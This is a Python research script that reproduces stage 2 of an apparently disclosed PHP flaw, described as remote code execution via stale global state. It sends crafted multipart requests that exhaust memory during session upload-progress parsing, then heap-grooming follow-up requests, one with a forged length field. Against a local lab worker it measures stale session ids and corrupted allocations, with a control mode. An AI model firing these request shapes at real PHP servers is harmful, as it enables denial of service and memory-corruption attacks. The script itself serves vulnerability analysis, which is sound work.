#!/usr/bin/env python3
"""Stage 2: what an OOM-aborted request leaves behind for the NEXT request.

Stage 1 (probe.py) shows a small request exhausting `memory_limit` during
request startup. This script asks the follow-up question from the second half
of the same disclosure (CVE-2026-109619, "RCE via stale global state"):

    after a request dies from OOM, does the next request on the SAME worker
    read session state out of memory that was freed and then recycled?

The observable is the response itself -- the session id PHP puts in
`Set-Cookie`. A healthy worker returns 32 random characters. A worker that
inherited stale session state returns whatever the recycled memory says the id
is, including its length.

Modes:

  fresh   consumers only, against a worker that has never seen an OOM
          -> expected: 32-byte ids, no fatals (the control)

  after   one OOM producer, then a consumer, repeated
          -> expected on the vulnerable build: anomalous ids, startup warning,
             and sometimes a corrupted allocation size

  sweep   vary the consumer's filler value size
          -> shows whether the emitted id length tracks attacker input

  abort   shapes that die outright; prints the fatal, which is the corrupted
          allocation size taken from stale memory

Multipart shapes and the producer geometry are adapted from the public
"Steal My Bitcoin" proof of concept (KillaBoi/StealMyBitcoin-PoC) so the two
can be compared directly. That PoC declares no licence, so this is an
independent implementation of the same technique, not a copy; see
docs/ANALYSIS.md for provenance and for the parts that did NOT reproduce.

Usage:
  ./stage2.py --port 8426 fresh
  ./stage2.py --port 8426 after --reps 40
  ./stage2.py --port 8426 sweep
"""
import argparse
import socket
import struct
import sys
import urllib.parse

BOUNDARY = b"COOKIE-LAB-BOUNDARY"
CONSUMERS = 8
COOKIE_PAIRS = 1001          # empty cookie names on every producer
ORDINARY_ID_BYTES = 32       # what a healthy PHPSESSID looks like

# Producer geometry, as calibrated by the public PoC for this build family.
PRODUCER_HEAP = dict(depth=57, count=950, field_count=50, value_size=1)
PRODUCER_CODE = dict(depth=58, count=935, field_count=65, value_size=39)

# Stamped into a field value in the hope of landing on a recycled string
# header's length field. This is the public PoC's decoupling step; on this
# lab's layout it does not land (see docs/ANALYSIS.md).
FORGED_OFFSET = 0x10
FORGED_LENGTH = 256


def part(name, value=b"", filename=None):
    head = (b"--" + BOUNDARY +
            b'\r\nContent-Disposition: form-data; name="' + name + b'"')
    if filename is not None:
        head += b'; filename="' + filename + b'"'
    return head + b"\r\n\r\n" + value + b"\r\n"


def body(parts):
    return b"".join(parts) + b"--" + BOUNDARY + b"--\r\n"


def producer(geom):
    """Small on the wire, fatal in memory: deep nested names + upload progress.

    The NUL `PHPSESSID` field and `PHP_SESSION_UPLOAD_PROGRESS` are what drag
    PHP's session code into request parsing, so the OOM lands with session
    state half-built -- which is the whole point of the request.
    """
    parts = [part(("p%04d" % i).encode(), b"x" * geom["value_size"])
             for i in range(geom["field_count"])]
    parts += [part(b"PHPSESSID", b"\x00"),
              part(b"PHP_SESSION_UPLOAD_PROGRESS", b"ppp"),
              part(b"f", b"A" * 64, b"a.txt")]
    for i in range(geom["count"]):
        parts.append(part(b"f[" + str(i).encode() + b"]" + b"[x]" * geom["depth"],
                          filename=b""))
    return body(parts)


def consumer(value_size=24, fields=73, array_at=69, array_len=16, array_value=16):
    """A follow-up request shaped to recycle the stale worker's memory."""
    parts = [part(b"PHPSESSID", b"a"), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(fields):
        parts.append(part(("s%04d" % i).encode(), b"P" * value_size))
    for i in range(983 - fields):
        for j in range(array_len if i == array_at else 1):
            parts.append(part(("a%04d[%d]" % (i, j)).encode(), b"x" * array_value))
    return body(parts)


def forged_consumer():
    """The public PoC's heap-stage consumer: length stamped into a value."""
    parts = [part(b"PHPSESSID", b"a"), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(51):
        parts.append(part(str(1000 + i).encode(),
                          ("v%04d" % i).encode() + b"x" * 48))
    parts.append(part(b"1050", b"Z" * 128))
    forged = bytearray(b"A" * 79)
    struct.pack_into("<Q", forged, FORGED_OFFSET, FORGED_LENGTH)
    forged[0x18] = ord("L")
    parts.append(part(b"1999", bytes(forged)))
    return body(parts)


def frame(payload, cookies=0, close=True, path="/index.php"):
    lines = ["POST %s HTTP/1.1" % path, "Host: 127.0.0.1",
             "Connection: close" if close else "Connection: keep-alive",
             "Content-Length: %d" % len(payload),
             "Content-Type: multipart/form-data; boundary=" + BOUNDARY.decode()]
    if cookies:
        alphabet = "0123456789abcdefghijklmnopqrstuvwxyz"
        lines.append("Cookie: " + "".join(
            alphabet[(i // 36) % 36] + alphabet[i % 36] + "=;" for i in range(cookies)))
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + payload


def send(port, payload, cookies=0):
    sock = socket.create_connection(("127.0.0.1", port), timeout=60)
    sock.sendall(frame(payload, cookies=cookies))
    raw = b""
    while True:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        raw += chunk
    sock.close()
    return raw


def session_id(raw):
    head = raw.split(b"\r\n\r\n", 1)[0].decode(errors="replace")
    for line in head.split("\r\n"):
        if line.lower().startswith("set-cookie") and "PHPSESSID=" in line:
            encoded = line.split("PHPSESSID=", 1)[1].split(";", 1)[0]
            return urllib.parse.unquote_to_bytes(encoded.replace("+", " "))
    return None


def classify(raw):
    """Return (session_id, tags)."""
    tags = []
    if b"Possible integer overflow in memory allocation" in raw:
        tags.append("CORRUPT_ALLOC")
    if b"Allowed memory size" in raw:
        tags.append("OOM")
    if b"Session ID is too long or contains illegal characters" in raw:
        tags.append("STALE_SESSION_ID_WARNING")
    if b"REACHED_APP" in raw:
        tags.append("APP_REACHED")
    if not raw:
        tags.append("NO_RESPONSE")
    return session_id(raw), tags


def histogram(pairs):
    counts = {}
    for sid, _tags in pairs:
        key = len(sid) if sid is not None else -1
        counts[key] = counts.get(key, 0) + 1
    return counts


def anomaly(sid):
    return sid is not None and len(sid) != ORDINARY_ID_BYTES


def mode_fresh(args):
    cons = consumer(args.value_size)
    pairs = []
    print("consumer only, worker has never been OOM'd")
    for _ in range(args.reps):
        pairs.append(classify(send(args.port, cons)))
    print("  session id lengths :", histogram(pairs))
    bad = [p for p in pairs if anomaly(p[0]) or "CORRUPT_ALLOC" in p[1]]
    if bad:
        print("  >>> ANOMALY on a fresh worker -- the control FAILED <<<")
        return 1
    print("  >>> CLEAN: every id was %d bytes, no fatals <<<" % ORDINARY_ID_BYTES)
    return 0


def mode_after(args):
    geom = PRODUCER_CODE if args.producer == "code" else PRODUCER_HEAP
    prod = producer(geom)
    cons = consumer(args.value_size)
    print("producer wire size : %d bytes" % len(prod))
    oom = 0
    pairs = []
    warned = 0
    fatal = 0
    for _ in range(args.reps):
        if b"Allowed memory size" in send(args.port, prod, cookies=COOKIE_PAIRS):
            oom += 1
        sid, tags = classify(send(args.port, cons))
        pairs.append((sid, tags))
        warned += "STALE_SESSION_ID_WARNING" in tags
        fatal += "CORRUPT_ALLOC" in tags
    print("  producer OOM       : %d/%d" % (oom, args.reps))
    print("  session id lengths :", histogram(pairs))
    print("  stale-id warning   : %d/%d" % (warned, args.reps))
    print("  corrupted alloc    : %d/%d" % (fatal, args.reps))
    hits = sum(1 for sid, _ in pairs if anomaly(sid))
    if hits:
        sample = next(sid for sid, _ in pairs if anomaly(sid))
        print("  >>> ANOMALY: %d/%d ids were not %d bytes; sample = %s <<<"
              % (hits, args.reps, ORDINARY_ID_BYTES, sample.hex()))
        return 0
    if fatal:
        print("  >>> ANOMALY: no stale id, but %d/%d follow-up requests died on a "
              "corrupted allocation size taken from stale memory <<<" % (fatal, args.reps))
        return 0
    print("  >>> no anomaly this run -- pairing/geometry dependent; "
          "see docs/ANALYSIS.md <<<")
    return 1


def mode_sweep(args):
    prod = producer(PRODUCER_CODE)
    print("filler value size -> session id length PHP emits")
    print("  %-8s %-8s %s" % ("vsize", "n", "id lengths seen"))
    for value_size in (8, 16, 24, 32, 48, 64, 96, 128, 192, 256, 512):
        cons = consumer(value_size)
        pairs = []
        for _ in range(args.reps):
            send(args.port, prod, cookies=COOKIE_PAIRS)
            pairs.append(classify(send(args.port, cons)))
        print("  %-8d %-8d %s" % (value_size, args.reps, histogram(pairs)))
    return 0


def mode_abort(args):
    prod = producer(PRODUCER_CODE)
    print("shapes that die outright -- the allocation size comes from stale memory")
    for value_size in (32, 48, 64, 192):
        cons = consumer(value_size)
        seen = []
        for _ in range(args.reps):
            send(args.port, prod, cookies=COOKIE_PAIRS)
            raw = send(args.port, cons)
            payload = raw.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in raw else raw
            text = payload.decode(errors="replace").strip().replace("\n", " ")
            seen.append(text[:150] if text else "(empty)")
        print("  vsize=%-4d %s" % (value_size, seen[0]))
    return 0


def mode_forged(args):
    prod = producer(PRODUCER_HEAP)
    cons = forged_consumer()
    pairs = []
    for _ in range(args.reps):
        send(args.port, prod, cookies=COOKIE_PAIRS)
        pairs.append(classify(send(args.port, cons)))
    print("public PoC's heap-stage consumer (length stamped at 0x%x = %d)"
          % (FORGED_OFFSET, FORGED_LENGTH))
    print("  session id lengths :", histogram(pairs))
    hits = sum(1 for sid, _ in pairs if anomaly(sid))
    print("  anomalous ids      : %d/%d" % (hits, args.reps))
    return 0


MODES = {"fresh": mode_fresh, "after": mode_after, "sweep": mode_sweep,
         "abort": mode_abort, "forged": mode_forged}


def main():
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("mode", choices=sorted(MODES))
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--reps", type=int, default=20)
    parser.add_argument("--value-size", type=int, default=24)
    parser.add_argument("--producer", choices=("heap", "code"), default="code",
                        help="producer geometry for the 'after' mode; the "
                             "pairing changes which stale-state symptom appears")
    args = parser.parse_args()
    return MODES[args.mode](args)


if __name__ == "__main__":
    sys.exit(main())
